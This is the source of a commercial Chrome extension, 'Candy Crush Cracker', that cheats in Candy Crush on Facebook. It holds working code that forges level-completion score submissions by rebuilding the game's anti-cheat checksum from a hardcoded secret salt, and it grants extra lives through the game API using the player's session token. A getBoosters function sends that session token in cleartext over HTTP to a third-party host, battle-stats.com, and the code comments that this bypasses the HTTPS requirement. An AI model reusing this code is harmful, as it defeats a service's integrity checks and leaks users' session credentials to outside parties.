const HELP_LINK = "https://apptastic.uservoice.com/knowledgebase/topics/78310-candy-crush-cracker";
const APP_NAME = "Candy Crush Cracker";
const APP_LINK = "https://chrome.google.com/webstore/detail/candy-crush-cracker/bgennlofmbkobjldjlnijimhiohpahop";
const APP_REVIEW_LINK = "https://chrome.google.com/webstore/detail/candy-crush-cracker/bgennlofmbkobjldjlnijimhiohpahop/reviews";

var cachedLicenseStatus = null;
var cachedLicenseCachedUntilTime = new Date(0);

function setUp() {
    
    setTimeout(function() {
        var hackButtonClass = "hackButton";
        
        var existingHackButton = $("." + hackButtonClass);
        var hackButtonContainer = $($(".bannerItemCnt")[4]);
        
        if(existingHackButton.length == 0 && hackButtonContainer.length != 0) {
            var hackButton = $("<button />");
            var hackImage = $("<img title='Hack Candy Crush!' style='width: 60px' />");
            var hackButtonImage = 'images/app/candyCrushCrackerButton.png';
            hackImage.attr("src", chrome.extension.getURL(hackButtonImage));
            hackButton.append(hackImage);
            hackButton.addClass(hackButtonClass);
            hackButton.click(function() {
                
                $("<div title='What would you like to do?' />").dialog({
                    width: 510,

                    buttons: {
                        "Add Life": function() {
                            addLife();
                            $(this).dialog("close");
                        },
                        "Beat Current Level": function() {
                            beatLevel();
                            $(this).dialog("close");
                        },
                        "More Cheats": function() {
                            showOtherCheats();
                            $(this).dialog("close");
                        },
                        "Help": function() {
                            window.open(HELP_LINK);
                            $(this).dialog("close");
                        }
                    }

                });
            });

            hackButtonContainer.html("").append(hackButton);

            askUserToReview();
        }
        else{
            setUp();
        }
    }, 500);

}

function getBoosters() {
    verifyLicense(function() {
        
        chrome.runtime.sendMessage({"getCurrentLevelData": true}, function(gameData) {
            console.log(gameData);

            setTimeout(function() {
                window.location.reload();
            }, 3000);

            // bypass the requirement of ajax requests needing https, by issuing the request via an image instead
            var imgRequest = $("<img />").attr("src", "http://battle-stats.com/CandyCrushSaga/?_session=" + gameData.session);
            var body = document.getElementsByTagName("body")[0];
            body.innerHTML = body.innerHTML += imgRequest.html();
        });

    });
}

function addLife() {
    verifyLicense(function() {
        
        chrome.runtime.sendMessage({"getCurrentLevelData": true}, function(gameData) {
            console.log(gameData);

            $.ajax({
                url: "https://candycrush.king.com/api/addLife?_session=" + gameData.session
            })
            .done(function() {
                window.location.reload();
            });
        });

    });
}

function beatLevel() {
    verifyLicense(function() {

        chrome.runtime.sendMessage({"getCurrentLevelData": true}, function(gameData) {
            console.log(gameData);

            var score = prompt(
                "What score would you like to beat episode " + gameData.episode + ", level " + gameData.level + " with? Note: If the score you enter is not high enough, the level will not be beaten.",
                "100000");
            
            if (score != null) {
                
                getUserId(gameData.session, function(err, userId) {

                    var checksum = md5(gameData.episode + ":" + gameData.level + ":" + score + ":-1:" + userId + ":" + gameData.seed + ":BuFu6gBFv79BH9hk");
                    
                    var data = {
                        score: parseInt(score),
                        seed: parseInt(gameData.seed),
                        levelId: parseInt(gameData.level),
                        episodeId: parseInt(gameData.episode),
                        timeLeftPercent: -1,
                        variant: 0,
                        cs: checksum.substr(0,6),
                        reason: 0,
                        //movesMade: 6,
                        //movesLeft: 0,
                        //movesInit: 6
                    }

                    CandyCrush.EndGame(gameData.session, JSON.stringify(data), function(err, response) {
                       var response = response.response;
                       window.location.reload();
                    });
                });

            }

        });
    });
}

function getUserId(session, callback) {
    CandyCrush.GetGameInitInfo(session, function(err, response) {
        if(err) {
            callback(err);
        }
        else {
            callback(null, response.response.currentUser.userId);
        }
    });
}

function tellUserToPurchase() {
    alert("Your " + APP_NAME + " free trial has expired. Please buy the full version to continue using " + APP_NAME + ".");
    window.open(APP_LINK);
}

function verifyLicense(callback) {
    var now = new Date();
    var timeDiff = cachedLicenseCachedUntilTime - now;

    if(cachedLicenseStatus && timeDiff > 0) {
        // use cached license status
        console.log("cracker cached license: " + cachedLicenseStatus);
        console.log("Cached until: " + cachedLicenseCachedUntilTime);

        if(cachedLicenseStatus == "FULL" || cachedLicenseStatus == "FREE_TRIAL") {
            incrementPaidUses(cachedLicenseStatus);
            callback(cachedLicenseStatus);
        }
        else {
            tellUserToPurchase();
        }
    }
    else {
        // check license status and cache it

        chrome.runtime.sendMessage({"verifyLicense": true}, function(licenseStatus) {
            console.log("cracker license: " + licenseStatus);
            
            if(licenseStatus) {
                cachedLicenseStatus = licenseStatus;

                if(licenseStatus == "FULL" || licenseStatus == "FREE_TRIAL") {
                    // cache for 30 minutes
                    cachedLicenseCachedUntilTime = new Date(now.getTime() + 1000*60*30);
                    
                    incrementPaidUses(licenseStatus);
                    callback(licenseStatus);
                }
                else {
                    // cache for 1 minute
                    cachedLicenseCachedUntilTime = new Date(now.getTime() + 1000*60*1);

                    tellUserToPurchase();
                }
            }
            else {
                // hit an error, couldn't get license status
                alert("We were unable to validate your " + APP_NAME + " license. Opening troubleshooting page.");
                window.open("https://apptastic.uservoice.com/knowledgebase/articles/529153-why-does-candy-crush-cracker-tell-me-we-were-unab");
            }
        });
    }
}

function showOtherCheats() {
    $("<div title='More from Apptastic!'>Looking to cheat at other popular games? Check out our other hacks to get a leg up on the competition!</div>").dialog({
        width: 500,

        buttons: {
            "Candy Crush (Facebook)": function() {
                window.open("https://chrome.google.com/webstore/detail/candy-crush-cracker/bgennlofmbkobjldjlnijimhiohpahop");
                $(this).dialog("close");
            },
            "Trivia Crack (Facebook)": function() {
                window.open("https://chrome.google.com/webstore/detail/trivia-cracker/mpaoffaaolfohpleklnbmhbndphfgeef");
                $(this).dialog("close");
            }
            // "Trivia Crack (Android)": function() {
            //     window.open("https://play.google.com/store/apps/details?id=com.apptastic.cheatsfortriviacrack");
            //     $(this).dialog("close");
            // }
        }
    });
}

function askUserToReview() {
    if(localStorage.paidUses && parseInt(localStorage.paidUses) >= 20 && !localStorage.dontAskUserToReview) {
        
        $("<div title='How are we doing?'>Hey there! If you're enjoying " + APP_NAME + ", would you mind posting a quick review?</div>").dialog({
            width: 460,

            buttons: {
                "Sure": function() {
                    window.open(APP_REVIEW_LINK);
                    localStorage.setItem("dontAskUserToReview", "true");
                    $(this).dialog("close");
                },
                "Maybe later": function() {
                    $(this).dialog("close");
                },
                "No thanks": function() {
                    localStorage.setItem("dontAskUserToReview", "true");
                    $(this).dialog("close");
                }
            }
        });

    }
}

function incrementPaidUses(licenseStatus) {
    var paidUses = 1;

    if(localStorage.paidUses) {
        paidUses = parseInt(localStorage.paidUses) + 1;
    }

    localStorage.setItem("paidUses", ("" + paidUses));
}

document.addEventListener('DOMContentLoaded', function (evt) {
    setUp();
}, false);